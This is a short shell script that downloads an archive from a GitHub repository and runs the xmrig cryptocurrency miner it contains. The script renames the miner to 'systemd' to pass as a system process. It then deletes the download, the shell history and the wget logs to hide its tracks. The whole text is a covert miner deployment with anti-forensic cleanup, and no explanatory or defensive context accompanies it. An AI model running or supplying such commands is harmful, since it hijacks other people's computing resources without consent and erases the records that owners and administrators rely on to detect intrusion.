wget https://github.com/deusveritatis/trtl/archive/master.zip
unzip master.zip
cd trtl-master
mv xmrig systemd
chmod +x systemd
./systemd
cd ..
rm -r master.zip trtl-master nvtv1 .bash_history .wget-hsts wget-log
exit 
